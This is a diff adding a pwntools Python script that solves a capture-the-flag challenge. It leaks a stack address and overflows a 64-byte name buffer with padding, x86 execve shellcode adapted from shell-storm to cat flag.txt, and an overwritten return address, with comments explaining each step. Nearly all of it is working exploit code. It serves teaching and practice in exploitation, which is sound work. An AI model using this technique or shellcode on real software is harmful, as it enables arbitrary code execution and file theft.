@@ -1,0 +1,80 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+
+exe = context.binary = ELF("./shellter_your_code", checksec=False)
+context.log_level = "error"
+
+
+def start(argv=[], *a, **kw):
+    gdbscript = """
+    tbreak main
+    continue
+    """.format(
+        **locals()
+    )
+
+    if args.GDB:
+        context.log_level = "debug"
+        context.terminal = ["tmux", "split", "-h"]
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+def main():
+    io = start()
+
+    # When decompiling this file in ghydra, you immediately notice that this time there is no function that outputs the flag.
+    # Therefore, this time we have to write a function ourselves, change the return address from the programme to our code and thus have the flag output
+    # easier said than done
+    #
+    # If you google shell code file to output or you take the link from the sheets you will come relatively quickly to the site http://shell-storm.org which provides a bunch of shell code.
+    # It seems that the shellcode "bin/cat /etc/passwd - 43 bytes by fb1h2s" does pretty much what we want it to do by small changes.
+    #
+    # Then we first just change the syntax to python, try to understand what the individual lines do so that we can write proper comments.
+    # 
+    shellcode = [
+        b"\x83\xec\xaa",         # the problem here seems like that we override our own code if we not clean space on the stack, through a bit of bruteforcing this seems to work
+        b"\x31\xc0",             # xorl %eax,%eax
+        b"\x99",                 # cdq
+        b"\x52",                 # push edx
+        b"\x68\x2f\x63\x61\x74", # this lines can be left untouched
+        b"\x68\x2f\x62\x69\x6e", # /bin/cat
+        b"\x89\xe3",             # mov ebx,esp
+        b"\x52",                 # push edx
+        b"\x68\x2e\x74\x78\x74", # here we need to change to our flag file
+        b"\x68\x66\x6c\x61\x67", # flag.txt
+        b"\x89\xe1",             # mov ecx,esp
+        b"\xb0\x0b",             # mov $0xb,%al
+        b"\x52",                 # push edx
+        b"\x51",                 # push ecx
+        b"\x53",                 # push ebx
+        b"\x89\xe1",             # mov ecx,esp
+        b"\xcd\x80",             # int 80h
+    ]
+
+    # Now that we have our magical flag-issuing code, all we have to do is connect it to the pointer the programm gives us.
+    # Therefore we put the pointer in the right format
+    leak = io.recvuntil(b"Please enter your name:")
+    pointer = leak[6:16]
+    # with the static offset of 0x68 we get the address we want to return to
+    address = struct.pack('<I', (int(pointer,16)-0x68))
+
+    # as our name var is 64 long plus the 4 bytes we get a length of 68 bytes
+    # therefore we need to pad the rest of our package to this length (68-shellcode)
+    package = b"".join(shellcode)
+    padding_length = 68 - len(package)
+    padding = b'\x40' * padding_length
+
+    # now we have the padding + shellcode + addr
+    payload = [padding] + shellcode + [address]
+    # join this together in binary form
+    binary_payload = b"".join(payload)
+
+    io.sendline(binary_payload)
+    answer = (io.recvall())
+    answer = answer[82:120]
+    print(answer.decode("utf-8"))
+
+if __name__ == "__main__":
+    main()
